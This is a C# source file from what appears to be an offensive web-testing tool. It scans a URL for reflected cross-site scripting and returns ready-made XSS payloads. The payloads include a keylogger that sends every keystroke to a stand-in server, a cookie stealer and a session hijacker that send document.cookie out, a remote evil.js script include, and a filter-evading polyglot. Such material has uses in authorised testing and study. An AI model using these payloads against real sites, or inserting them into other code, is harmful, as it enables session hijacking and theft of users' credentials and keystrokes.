using File = WhoAreYou.Helpers.File;

namespace WhoAreYou.Modules;

internal class Xss
{
    public enum Payload
    {
        Keylogger,
        CookieStealer,
        SessionHijacker,
        ExampleJavascriptFunction,
        ExampleHtmlTag,
        ExampleHtmlTag2,
        ReflectedXss,
        Polyglot
    }

    private static readonly HttpClient Client = new();
    private readonly string _url;

    /// <param name="url">
    ///     The base URL which needs to have an empty parameter like `https://????.com?id=` (note the empty value after `=`).
    /// </param>
    public Xss(string url)
    {
        if (string.IsNullOrWhiteSpace(url))
            throw new ArgumentException("URL cannot be null or empty.", nameof(url));

        _url = url;
    }

    /// <param name="payload">The XSS payload to test.</param>
    /// <param name="expectedPayloadResponse">The expected response indicating a successful XSS attack.</param>
    /// <summary>
    ///     Tests the URL for XSS vulnerability by adding the payload to the given parameter.
    ///     Primarily used for reflected XSS.
    /// </summary>
    public async Task ScanXss(string payload, string expectedPayloadResponse)
    {
        var xssLink = File.GenerateFileName("XSS Vuln");
        var urlToTest = _url + payload;

        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine($"Testing: {urlToTest}");

        try
        {
            var response = await Client.GetAsync(urlToTest);

            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                if (content.Contains(expectedPayloadResponse))
                {
                    File.AppendToFile(xssLink, urlToTest);
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"Potential XSS vulnerability found at: {urlToTest}");
                    Console.ReadKey();
                }
            }
            else
            {
                Console.WriteLine($"Failed to access {urlToTest} (Status Code: {response.StatusCode})");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error occurred while testing {urlToTest}: {ex.Message}");
        }
    }

    /// <param name="payloadType">The type of XSS payload to generate.</param>
    public List<string> ExamplePayloads(Payload payloadType)
    {
        var payloads = new List<string>();

        switch (payloadType)
        {
            case Payload.Keylogger:
                payloads.Add(
                    "<script>document.onkeypress = function(e) { fetch('http://yourserver.com/log?key=' + e.key); };</script>");
                break;
            case Payload.CookieStealer:
                payloads.Add("<script>fetch('http://yourserver.com/log?cookie=' + document.cookie);</script>");
                break;
            case Payload.SessionHijacker:
                payloads.Add(
                    "<script>fetch('https://yourserver.com/steal?session=' + btoa(document.cookie));</script>");
                break;
            case Payload.ExampleJavascriptFunction:
                payloads.Add("<script>alert('XSS');</script>");
                break;
            case Payload.ExampleHtmlTag:
                payloads.Add("<img src='http://yourserver.com/log' onerror='alert(\"XSS\")'>");
                break;
            case Payload.ExampleHtmlTag2:
                payloads.Add("<script>alert('XSS');</script>");
                break;
            case Payload.ReflectedXss:
                payloads.Add("?error=<script src=\"url/evil.js\"></script>");
                break;
            case Payload.Polyglot:
                payloads.Add(
                    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('THM')//>\\x3e");
                break;
            default:
                throw new ArgumentOutOfRangeException(nameof(payloadType), payloadType, null);
        }

        return payloads;
    }
}